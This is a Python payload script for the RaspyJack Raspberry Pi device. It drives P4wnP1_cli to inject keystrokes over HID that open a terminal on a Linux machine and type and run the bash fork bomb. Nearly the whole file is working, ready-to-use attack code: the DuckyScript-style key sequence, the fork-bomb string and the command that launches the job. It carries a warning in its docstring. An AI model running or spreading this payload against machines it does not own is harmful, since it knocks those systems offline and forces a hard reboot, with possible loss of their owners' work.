#!/usr/bin/env python3
"""
RaspyJack *payload* – **HID Attack: Linux Fork Bomb**
=======================================================
A highly disruptive HID attack that opens a terminal on a Linux
machine and executes the classic bash fork bomb.

**!!! WARNING !!!**
This is a DENIAL OF SERVICE attack. It will render the target
machine unresponsive and will require a hard reboot. Use with
extreme caution and only on systems you own.
"""

import os, sys, subprocess, time
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

# --- Display Functions ---
def show_message(lines, color="red"):
    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    image = Image.new("RGB", (128, 128), "BLACK")
    draw = ImageDraw.Draw(image)
    font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
    y = 30
    for line in lines:
        draw.text((10, y), line, font=font, fill=color)
        y += 15
    LCD.LCD_ShowImage(image, 0, 0)

# --- Main Attack Logic ---
def run_attack():
    show_message(["!!! WARNING !!!", "Fork Bomb", "This will crash", "the target!"])
    time.sleep(4)
    show_message(["HID Attack:", "Linux Fork Bomb"])
    
    if subprocess.run("which P4wnP1_cli", shell=True, capture_output=True).returncode != 0:
        show_message(["ERROR:", "P4wnP1_cli", "not found!"])
        return

    # The classic bash fork bomb
    fork_bomb = ":(){ :|:& };:"
    
    # DuckyScript to open a terminal and execute the command
    script = f"""
CTRL-ALT t
delay(750)
type("{fork_bomb}")
delay(200)
press("ENTER")
"""
    
    command = f"P4wnP1_cli hid job -c '{script}'"
    
    try:
        subprocess.run(command, shell=True, check=True, timeout=20)
        show_message(["Attack Sent!", "Fork Bomb"])
    except Exception as e:
        show_message(["Attack FAILED!"])
        print(f"Error running HID attack: {e}", file=sys.stderr)

# --- Execution ---
if __name__ == '__main__':
    try:
        run_attack()
        time.sleep(3)
    finally:
        LCD = LCD_1in44.LCD()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("HID Attack payload finished.")
